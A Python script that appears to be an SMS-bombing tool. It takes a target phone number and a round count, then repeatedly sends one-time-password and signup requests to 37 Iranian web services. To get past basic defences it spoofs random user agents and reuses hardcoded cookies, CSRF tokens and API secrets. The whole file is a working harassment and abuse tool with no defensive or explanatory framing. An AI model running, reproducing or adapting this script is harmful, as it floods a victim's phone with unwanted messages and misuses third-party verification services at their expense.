import json
import requests
from fake_useragent import UserAgent
from time import sleep
from user_agent import generate_user_agent

fake = UserAgent()


headers = {'User-Agent':fake.random,'Pragma': 'no-cache', 'Accept': 'application/json'}



num = (input("Enter target number: "))
chanta = int(input("Enter round: "))
num0 = num[1:11]

url1 = "https://api.divar.ir/v5/auth/authenticate"
url1s = {"phone":num}

url2 = f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={num}"
url2s = {"cellphone": num}

url3 = f"https://core.gap.im/v1/user/add.json?mobile=%2B98{num0}"

url4 = "https://www.sheypoor.com/api/v10.0.0/auth/send"
url4s = {"username":num}

url5 = "https://restaurant.delino.com/user/register"
url5s = {"apiToken":"10tQStiKTniALgYpYQ4hm0UCuadXWbHdMklMIpyTE5DSzkNSfx1r2p02pqg3QKx3","clientSecret":"MZ0TNC0swsGFk6gbfCdvtZHRukZyFntu","device":"web","username":num}

url6 = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
url6s = {"phoneNumber": num}

url7 = "https://pinket.com/api/cu/v2/phone-verification"
url7s = {"phoneNumber": num}

url8 = "https://app.itoll.com/api/v1/auth/login"
url8s = {"mobile": num}

url9 = "https://api.karnameh.com/v1/carinspection/auth/authenticate"
url9s = {"phone":num}

url10 = "https://auth.basalam.com/otp-request"
url10s = {"mobile": num, "client_id": 11}

url11 = "https://mobapi.banimode.com/api/v2/auth/request"
url11s = {"phone":num}

url12 = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={num}"
url12s = {"cellphone": num}

url13 = "https://www.mydigipay.com/digipay/api/users/send-sms"
url13s = {"cellNumber":num,"device":{"deviceId":"d520c7a8-421b-4563-b955-f5abc56b97ec","deviceModel":"Windows/Chrome","deviceAPI":"WEB_BROWSER","osName":"WEB"}}

url14 = "https://abantether.com/users/register/phone/send/"
url14s = {"phoneNumber": num, "email": ""}

url15 = "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode"
url15s = {"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":"null","ApplicationVersion":"1.0.0","MobileNumber":num,"UniqueToken":"null"}}

url16 = "https://khodro45.com/api/v1/customers/otp/"
url16s = {"mobile":num}

url17 = "https://api.ostadkr.com/login"
url17s = {"mobile":num}

url18 = "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile"
url18s = {"mobile":num,"country_code":"98"}

url19 = "https://api.digikalajet.ir/user/login-register/"
url19s = {"phone": num}

url20 = "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/"
url20s = {"phone":num}

url21 = "https://www.miare.ir/api/otp/client/request/"
url21s = {"phone_number":num}

url22 = "https://gw.taaghche.com/v4/site/auth/signup"
url22s = {"contact":num}

url23 = "https://taraazws.jabama.com/api/v4/account/send-code"
url23s = {"mobile":num}

url24 = "https://next.zarinpal.com/api/oauth/register"
url24s = {"first_name": "بمبر", "last_name": "سسلام", "cell_number": num}

url25 = "https://drdr.ir/api/v3/auth/login/mobile/init"

cookies25 = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'a4ff710c-fb41-dbe5-b76b-76642dda2aca',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_gcl_au': '1.1.1781847905.1693559284',
    '_ga_366FTBNK6W': 'GS1.1.1693571905.2.0.1693571905.0.0.0',
    'analytics_session_token': '82624adc-b004-9dc6-eed9-538b8071763c',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '_ga': 'GA1.2.219175219.1693559284',
    '_gid': 'GA1.2.1146854326.1693652823',
    '_gat_UA-101159391-1': '1',
    '_clck': 'ihvhkd|2|feo|0|1339',
    'crisp-client%2Fsession%2F929a93f7-17ea-492e-a5c1-3b1fd45f86b9': 'session_2c7984dc-6887-44f1-b01b-f0e9020a25c9',
    '_clsk': 'z52f4d|1693652825295|1|0|u.clarity.ms/collect',
    '_ga_VPMXG7C0RF': 'GS1.1.1693652822.3.1.1693652843.39.0.0',
}

headers25 = {
    'authority': 'drdr.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'no-store, max-age=0',
    'client-id': 'f60d5037-b7ac-404a-9e3a-a263fd9f8054',
    'content-type': 'application/json',
    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=a4ff710c-fb41-dbe5-b76b-76642dda2aca; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _gcl_au=1.1.1781847905.1693559284; _ga_366FTBNK6W=GS1.1.1693571905.2.0.1693571905.0.0.0; analytics_session_token=82624adc-b004-9dc6-eed9-538b8071763c; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; _ga=GA1.2.219175219.1693559284; _gid=GA1.2.1146854326.1693652823; _gat_UA-101159391-1=1; _clck=ihvhkd|2|feo|0|1339; crisp-client%2Fsession%2F929a93f7-17ea-492e-a5c1-3b1fd45f86b9=session_2c7984dc-6887-44f1-b01b-f0e9020a25c9; _clsk=z52f4d|1693652825295|1|0|u.clarity.ms/collect; _ga_VPMXG7C0RF=GS1.1.1693652822.3.1.1693652843.39.0.0',
    'origin': 'https://drdr.ir',
    'referer': 'https://drdr.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
}

json_data25 = {
    'mobile': num0,
}


url26 = "https://www.drsaina.com/RegisterLogin"
cookies26 = {
    '_gcl_au': '1.1.1722113967.1693570729',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}',
    'analytics_token': 'c3737ae6-fe40-3fd2-4df0-d283d8b71cb7',
    '_gid': 'GA1.2.1501739126.1693570730',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_gcl_aw': 'GCL.1693635738.Cj0KCQjwl8anBhCFARIsAKbbpyQRY-PnJd-TI9tr-8DIX9LOpzPEg-OLD6eufVdDaJk4-Obqy4Zb_S0aApdkEALw_wcB',
    'yektanet_session_last_activity': '9/2/2023',
    '_gac_UA-126198313-1': '1.1693635741.Cj0KCQjwl8anBhCFARIsAKbbpyQRY-PnJd-TI9tr-8DIX9LOpzPEg-OLD6eufVdDaJk4-Obqy4Zb_S0aApdkEALw_wcB',
    '.AspNetCore.Antiforgery.ej9TcqgZHeY': 'CfDJ8LAHk8-NI5hBqr_jKzR9ilJhBNKoE6klFn9M21uuOEvWlJ7-gOzY_k-iQmMpgCN3I7iyrA0UEsFfqu_Uj0mgI35MWeY47yfjspATjp-Vv8NZjFeUwEV53agYr35GzQys-QrqgGaK20mbnVNCgDmZVos',
    'MEDIAAD_USER_ID': '652b79ba-1154-40f7-a577-9788d6bbd169',
    '_yngt_iframe': '1',
    '_ga': 'GA1.2.1165757217.1693570729',
    '_ga_TZ59YW6Z4C': 'GS1.1.1693648612.5.1.1693648713.22.0.0',
}

headers26 = {
    'authority': 'www.drsaina.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gcl_au=1.1.1722113967.1693570729; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=c3737ae6-fe40-3fd2-4df0-d283d8b71cb7; _gid=GA1.2.1501739126.1693570730; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _gcl_aw=GCL.1693635738.Cj0KCQjwl8anBhCFARIsAKbbpyQRY-PnJd-TI9tr-8DIX9LOpzPEg-OLD6eufVdDaJk4-Obqy4Zb_S0aApdkEALw_wcB; yektanet_session_last_activity=9/2/2023; _gac_UA-126198313-1=1.1693635741.Cj0KCQjwl8anBhCFARIsAKbbpyQRY-PnJd-TI9tr-8DIX9LOpzPEg-OLD6eufVdDaJk4-Obqy4Zb_S0aApdkEALw_wcB; .AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8LAHk8-NI5hBqr_jKzR9ilJhBNKoE6klFn9M21uuOEvWlJ7-gOzY_k-iQmMpgCN3I7iyrA0UEsFfqu_Uj0mgI35MWeY47yfjspATjp-Vv8NZjFeUwEV53agYr35GzQys-QrqgGaK20mbnVNCgDmZVos; MEDIAAD_USER_ID=652b79ba-1154-40f7-a577-9788d6bbd169; _yngt_iframe=1; _ga=GA1.2.1165757217.1693570729; _ga_TZ59YW6Z4C=GS1.1.1693648612.5.1.1693648713.22.0.0',
    'origin': 'https://www.drsaina.com',
    'referer': 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

params26 = {
    'ReturnUrl': '/consultation',
}

data26 = {
    '__RequestVerificationToken': 'CfDJ8LAHk8-NI5hBqr_jKzR9ilLPQe8BFQWgVZSRYv90UPiAAqgH8ahD2l4FsVgEODpgV2ZDmdONXVNW2MOO6t7Cy0QgdlLhGiNPjhvHwNeOHN1otbneERVJQh_R3Kv6oY_sIdmBFiKir1OXdTz6dhNWCVM',
    'noLayout': 'False',
    'action': 'checkIfUserExistOrNot',
    'lId': '',
    'codeGuid': '00000000-0000-0000-0000-000000000000',
    'PhoneNumber': num,
    'confirmCode': '',
    'fullName': '',
    'Password': '',
    'Password2': '',
}

url27 = "https://atawich.com/Account/FoodPhoneNumberVerification/"

cookies27 = {
    'timeZone': '',
    'wm1400': 'CfDJ8KS4pps4EFJEhn0uMhvZWqmH1nfcv-l5fl7IIG7KtbpMHHS6B_BfuJptcggYuDaUUNs9VGTq39soeKPE4f4eg054PA8KzfFwRDdDaGWQ18bcK-WVcMtHUYMkbLvWnAbze3ZQpzxezMmTQufw5D_ZsFA',
    'v_referrer': 'www.google.com',
    'v_url': '%2F',
    'BasketID': '86792076',
    'checkTextTrnslateLan': 'fa',
    'BB6BCBB84C4117563D4C936F1EF357E094744274': 'D8CE909A434FF4358F075CCC81C4F99534C75E9A',
    '.AspNetCore.Antiforgery.C8JE6cPNpd8': 'CfDJ8KS4pps4EFJEhn0uMhvZWqlmkQb42LxfVEmSAKRhJrhGR-BhUw1k5RsIjSyGJCkhpnDfCFrcKTkdYOrIh_dNr6ny6nLbOGQQ6TL4-BdDL_oO6MmNIUdQsGF9ztpwPcO3zSZ_ZWwAiTB-ekvxzq1NAI0',
    '.AspNetCore.Session': 'CfDJ8KS4pps4EFJEhn0uMhvZWqkzevy7LH%2Bp346MQTnWP%2BCoRdkuDD2iPb%2FDlf3xXqRUe9uHwEZhhQM9u5mQfjEfiPFVHmpIHiH7eK4cdYbLFXPglQeW6UwQ2vNPgX3SUCW0nMb6%2BHL0LrXoYaii%2F6QMzGp23yMKYBw1LXYbdq%2BisJq2',
    '_ga': 'GA1.2.1387567309.1693653542',
    '_gid': 'GA1.2.879449029.1693653564',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '80462134-d914-4405-ed97-95f732ffb9f4',
    'analytics_session_token': 'ab153966-4147-3a90-a35a-c9e7d3d6c6b1',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    'dishSeparateKind': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga_1BSZGWBHMR': 'GS1.1.1693653541.1.1.1693654095.0.0.0',
    '_ga_J1E5M6VQYF': 'GS1.1.1693653561.1.1.1693654095.0.0.0',
}

headers27 = {
    'authority': 'atawich.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'timeZone=; wm1400=CfDJ8KS4pps4EFJEhn0uMhvZWqmH1nfcv-l5fl7IIG7KtbpMHHS6B_BfuJptcggYuDaUUNs9VGTq39soeKPE4f4eg054PA8KzfFwRDdDaGWQ18bcK-WVcMtHUYMkbLvWnAbze3ZQpzxezMmTQufw5D_ZsFA; v_referrer=www.google.com; v_url=%2F; BasketID=86792076; checkTextTrnslateLan=fa; BB6BCBB84C4117563D4C936F1EF357E094744274=D8CE909A434FF4358F075CCC81C4F99534C75E9A; .AspNetCore.Antiforgery.C8JE6cPNpd8=CfDJ8KS4pps4EFJEhn0uMhvZWqlmkQb42LxfVEmSAKRhJrhGR-BhUw1k5RsIjSyGJCkhpnDfCFrcKTkdYOrIh_dNr6ny6nLbOGQQ6TL4-BdDL_oO6MmNIUdQsGF9ztpwPcO3zSZ_ZWwAiTB-ekvxzq1NAI0; .AspNetCore.Session=CfDJ8KS4pps4EFJEhn0uMhvZWqkzevy7LH%2Bp346MQTnWP%2BCoRdkuDD2iPb%2FDlf3xXqRUe9uHwEZhhQM9u5mQfjEfiPFVHmpIHiH7eK4cdYbLFXPglQeW6UwQ2vNPgX3SUCW0nMb6%2BHL0LrXoYaii%2F6QMzGp23yMKYBw1LXYbdq%2BisJq2; _ga=GA1.2.1387567309.1693653542; _gid=GA1.2.879449029.1693653564; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=80462134-d914-4405-ed97-95f732ffb9f4; analytics_session_token=ab153966-4147-3a90-a35a-c9e7d3d6c6b1; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; dishSeparateKind=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga_1BSZGWBHMR=GS1.1.1693653541.1.1.1693654095.0.0.0; _ga_J1E5M6VQYF=GS1.1.1693653561.1.1.1693654095.0.0.0',
    'origin': 'https://atawich.com',
    'referer': 'https://atawich.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

params27 = {
    'lazyLoad': 'true',
    'btnID': 'undefined',
}

data27 = {
    'PhoneNumber': num,
    'call': 'false',
    'data1': '173702fc-a22f-4de5-a3dc-b52cd00806d3',
    'data2': '638292627215757560',
    'ForgetPass': 'false',
}

url28 = "https://seniorebrahimi.com/account/login/"

cookies28 = {
    'csrftoken': 'QTz41ugQ5uqxkY1MGWJDAYkoK0CtQwyo',
}

headers28 = {
    'authority': 'seniorebrahimi.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'csrftoken=QTz41ugQ5uqxkY1MGWJDAYkoK0CtQwyo',
    'origin': 'https://seniorebrahimi.com',
    'referer': 'https://seniorebrahimi.com/account/login/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

data28 = {
    'csrfmiddlewaretoken': 'prfoTP75mb6eo7DYnuykRTaVuYjZzbun5aEiK9dLhvmByVuATg7NhHk94OLifxSB',
    'mobile': num,
}

url29 = "https://sandbox.sibbazar.com/api/v1/user/invite"
headers29 = {
    'authority': 'sandbox.sibbazar.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://developer.sibbazar.com',
    'referer': 'https://developer.sibbazar.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

json_data29 = {
    'username': num,
}




url30 = "https://core.gapfilm.ir/api/v3.1/Account/Login"
headers30 = {
    'authority': 'core.gapfilm.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'fa',
    'advertiseid': 'Mozilla/5.0 (Windows NT 10.0; Win64;',
    'androidid': 'Mozilla/5.0 (Windows NT 10.0; Win64;',
    'browser': 'Chrome',
    'browserversion': '116.0.0.0',
    'content-type': 'application/json',
    'devicemodel': 'Mozilla/5.0 (Windows NT 10.0; Win64;',
    'origin': 'https://www.gapfilm.ir',
    'os': 'Windows',
    'osversion': 'NT 10.0',
    'referer': 'https://www.gapfilm.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sourcechannel': 'GF_WebSite',
    'sourceenvironment': 'Website',
    'user-agent': fake.random,
}

json_data30 = {
    'Type': 3,
    'Username': num0,
    'SourceChannel': 'GF_WebSite',
    'SourcePlatform': 'desktop',
    'SourcePlatformAgentType': 'Chrome',
    'SourcePlatformVersion': '116.0.0.0',
    'GiftCode': None,
}

url31 = "https://nobat.ir/api/public/patient/login/phone"
headers31 = {
    'authority': 'nobat.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'authorization': 'Bearer undefined',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryiYaSBjIEl7kfJIrF',
    'nobat-cookie': '{"_ga":"GA1.1.2103201941.1693570182","defaultCity":"34","_ga_KEKNLD11WM":"GS1.1.1693655736.2.1.1693655807.0.0.0"}',
    'origin': 'https://user.nobat.ir',
    'referer': 'https://user.nobat.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

data31 = f'------WebKitFormBoundaryiYaSBjIEl7kfJIrF\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n{num0}\r\n------WebKitFormBoundaryiYaSBjIEl7kfJIrF\r\nContent-Disposition: form-data; name="use_emta_v2"\r\n\r\nyes\r\n------WebKitFormBoundaryiYaSBjIEl7kfJIrF\r\nContent-Disposition: form-data; name="domain"\r\n\r\nnobat\r\n------WebKitFormBoundaryiYaSBjIEl7kfJIrF--\r\n'


url32 = "https://shahrfarsh.com/Account/Login"
cookies32 = {
    '_gid': 'GA1.2.548925594.1693658664',
    'analytics_token': 'f39de2b5-3c55-7389-673b-413127403d89',
    'analytics_session_token': '0530c68e-2605-27b7-81c2-eb070e56ce5f',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga_BNFE2XCVSW': 'GS1.1.1693658665.1.0.1693658665.0.0.0',
    '_ga': 'GA1.1.919520603.1693658664',
    '_ym_uid': '1693658666830688261',
    '_ym_d': '1693658666',
    '_ym_isad': '2',
    '_ym_visorc': 'w',
}

headers32 = {
    'authority': 'shahrfarsh.com',
    'accept': 'text/plain, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gid=GA1.2.548925594.1693658664; analytics_token=f39de2b5-3c55-7389-673b-413127403d89; analytics_session_token=0530c68e-2605-27b7-81c2-eb070e56ce5f; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga_BNFE2XCVSW=GS1.1.1693658665.1.0.1693658665.0.0.0; _ga=GA1.1.919520603.1693658664; _ym_uid=1693658666830688261; _ym_d=1693658666; _ym_isad=2; _ym_visorc=w',
    'origin': 'https://shahrfarsh.com',
    'referer': 'https://shahrfarsh.com/Account/Login',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data32 = {
    'phoneNumber': num,
}


url33 = "https://dicardo.com/main/sendsms"
cookies33 = {
    'PHPSESSID': '7b673c5a9b692aff39fea79e3ceb01dce0ee3213',
    'theme': 'dark',
}

headers33 = {
    'authority': 'dicardo.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=7b673c5a9b692aff39fea79e3ceb01dce0ee3213; theme=dark',
    'origin': 'https://dicardo.com',
    'referer': 'https://dicardo.com/register',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data33 = {
    'phone': num,
    'type': '0',
    'codmoaref': '',
}


url34 = "https://rezagem.com/wp-admin/admin-ajax.php"
cookies34 = {
    'd_user_session': 'bd4aa317fe440de1aedb66f5fcbaa7d773da8fcd28532570b8eb98aac6a6bb1ce6a6cef0755afb88141b89d7c6dd1f65a605c49d46ee501b1016fa56d4aad5a6',
}

headers34 = {
    'authority': 'rezagem.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'd_user_session=bd4aa317fe440de1aedb66f5fcbaa7d773da8fcd28532570b8eb98aac6a6bb1ce6a6cef0755afb88141b89d7c6dd1f65a605c49d46ee501b1016fa56d4aad5a6',
    'origin': 'https://rezagem.com',
    'referer': 'https://rezagem.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data34 = {
    'action': 'digits_check_mob',
    'countrycode': '+98',
    'mobileNo': num0,
    'csrf': '1e88bd4519',
    'login': '1',
    'username': '',
    'email': '',
    'captcha': '',
    'captcha_ses': '',
    'digits': '1',
    'json': '1',
    'whatsapp': '0',
    'mobmail': num0,
    'dig_otp': '',
    'dig_nounce': '1e88bd4519',
}

url35 = "https://api.bitpin.ir/v2/usr/signin/"
url35s = {"phone":num}

url36 = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
headers36 = {
    'authority': 'api.cafebazaar.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://cafebazaar.ir',
    'referer': 'https://cafebazaar.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

json_data36 = {
    'properties': {
        'language': 2,
        'clientID': 'spqv28hi7u3la0bcrdtamburaz0y3acs',
        'deviceID': 'spqv28hi7u3la0bcrdtamburaz0y3acs',
        'clientVersion': 'web',
    },
    'singleRequest': {
        'getOtpTokenRequest': {
            'username': '98' + num0,
        },
    },
}

url37 = "https://panel.idpay.ir/api/v1/user/verification"
url37s = {"number":num,"type":"login"}

for i in range(1, chanta + 1):
    number = i 
    res1 = requests.post(url=url1, json=url1s, headers=headers)
    res2 = requests.post(url=url2, json=url2s, headers=headers)
    res3 = requests.get(url=url3, headers=headers)
    res4 = requests.post(url=url4, json=url4s, headers=headers)
    res5 = requests.post(url=url5, json=url5s, headers=headers)
    res6 = requests.post(url=url6, json=url6s, headers=headers)
    res7 = requests.post(url=url7, json=url7s, headers=headers)
    res8 = requests.post(url=url8, json=url8s, headers=headers)
    res9 = requests.post(url=url9, json=url9s, headers=headers)
    res10 = requests.post(url=url10, json=url10s, headers=headers)
    res11 = requests.post(url=url11, json=url11s, headers=headers)
    res12 = requests.post(url=url12, json=url12s, headers=headers)
    res13 = requests.post(url=url13, json=url13s, headers=headers)
    res14 = requests.post(url=url14, json=url14s, headers=headers)
    res15 = requests.post(url=url15, json=url15s, headers=headers)
    res16 = requests.post(url=url16, json=url16s, headers=headers)
    res17 = requests.post(url=url17, json=url17s, headers=headers)
    res18 = requests.post(url=url18, json=url18s, headers=headers)
    res19 = requests.post(url=url19, json=url19s, headers=headers)
    res20 = requests.post(url=url20, data=url20s, headers=headers)
    res21 = requests.post(url=url21, data=url21s, headers=headers)
    res22 = requests.post(url=url22, json=url22s, headers=headers)
    res23 = requests.post(url=url23, json=url23s, headers=headers)
    res24 = requests.post(url=url24, json=url24s, headers=headers)
    res25 = requests.post(url=url25, cookies=cookies25, headers=headers25, json=json_data25)
    res26 = requests.post(url=url26, params=params26, cookies=cookies26, headers=headers26, data=data26)
    res27 = requests.post(url=url27, params=params27, cookies=cookies27, headers=headers27, data=data27)
    res28 = requests.post(url=url28, cookies=cookies28, headers=headers28, data=data28)
    res29 = requests.post(url=url29, headers=headers29, json=json_data29)
    res30 = requests.post(url=url30, headers=headers30, json=json_data30)
    res31 = requests.post(url=url31, headers=headers31, data=data31)
    res32 = requests.post(url=url32, cookies=cookies32, headers=headers32, data=data32)
    res33 = requests.post(url=url33, cookies=cookies33, headers=headers33, data=data33)
    res34 = requests.post(url=url34, cookies=cookies34, headers=headers34, data=data34)
    res35 = requests.post(url=url35, json=url35s, headers=headers)
    res36 = requests.post(url=url36, headers=headers36, json=json_data36)
    res37 = requests.post(url=url37, json=url37s, headers=headers)
    print("Round", number,"complete")
sleep(10)